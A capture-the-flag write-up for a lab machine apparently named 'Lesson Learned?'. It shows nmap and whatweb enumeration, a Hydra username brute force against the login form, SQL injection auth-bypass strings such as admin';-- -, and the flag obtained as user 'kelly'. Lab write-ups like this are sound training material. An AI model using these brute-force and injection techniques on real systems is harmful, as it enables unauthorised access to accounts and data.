``Host``: 10.10.227.137

## Enumeration

```r
sudo nmap -sS -sC 10.10.227.137 --open
[sudo] password for dcyberguy: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-05 11:10 EDT
Nmap scan report for 10.10.227.137
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 2e:54:89:ae:f7:91:4e:33:6e:10:89:53:9c:f5:92:db (RSA)
|   256 dd:2c:ca:fc:b7:65:14:d4:88:a3:6e:55:71:65:f7:2f (ECDSA)
|_  256 2b:c2:d8:1b:f4:7b:e5:78:53:56:01:9a:83:f3:79:81 (ED25519)
80/tcp open  http
|_http-title: Lesson Learned?

Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
```

From the enumeration gathered I found two services running and two different protocols
``Found:``
SSH running on port 22
HTTP running on port 80

#### Enumerating using whatsweb
```r
whatweb http://10.10.227.137 -v
WhatWeb report for http://10.10.227.137
Status    : 200 OK
Title     : Lesson Learned?
IP        : 10.10.227.137
Country   : RESERVED, ZZ

Summary   : Apache[2.4.54], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], PasswordField[password]

Detected Plugins:
[ Apache ]
	<< snip >>

	Version      : 2.4.54 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Debian Linux
	String       : Apache/2.4.54 (Debian) (from server string)

[ PasswordField ]
	find password fields 

	String       : password (from field name)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Sun, 05 May 2024 15:13:34 GMT
	Server: Apache/2.4.54 (Debian)
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 597
	Connection: close
	Content-Type: text/html; charset=UTF-8
```
``Found:``
- HTTP server is running Debian, Linux
- Also running on Apache 2.4.54

Let's visit the webpage. On navigating to http://10.10.227.137 we can see a login form screen. I'll try a random credential ``admin:admin``. Though it didn't get us through because of course it is the wrong username:password combination, but it gave us a hint on the error message ``Invalid username and password`` and the payload raw summary as ``username=admin&password=admin``.

#### Using SQL Command
Let's try some SQL command that we use to bypass a login form like:
- Auth Bypass: admin';-- -
- SELECT * FROM users WHERE username = 'admin'; -- -' AND password = 'password'
- Boolean: ' AND '1'='1 / ' AND '1'='2
- SELECT * FROM articles WHERE author = 'admin' AND '1'='1'

For most of the above commands to be successful, we need a ``username``. Let's visit ``Hydra`` to try a username brute force.

```r
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p asdf 10.10.227.137 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password." 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-05 12:28:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://10.10.227.137:80/:username=^USER^&password=^PASS^:Invalid username and password.
[80][http-post-form] host: 10.10.227.137   login: martin   password: asdf
[80][http-post-form] host: 10.10.227.137   login: patrick   password: asdf
[80][http-post-form] host: 10.10.227.137   login: stuart   password: asdf
[80][http-post-form] host: 10.10.227.137   login: marcus   password: asdf
[80][http-post-form] host: 10.10.227.137   login: kelly   password: asdf
[80][http-post-form] host: 10.10.227.137   login: arnold   password: asdf
[80][http-post-form] host: 10.10.227.137   login: Martin   password: asdf
[80][http-post-form] host: 10.10.227.137   login: karen   password: asdf
[80][http-post-form] host: 10.10.227.137   login: Patrick   password: asdf
```
We are able to find some usernames that I would enumerate one after an other to discovered the right username.

By using the SQL injection: admin';-- -  on the username field (replace 'admin' with the username)

We were able to obtain the flag using the ``kelly`` user.

``Flag:`` # THM{aab02c6b76bb752456a54c80c2d6fb1e}


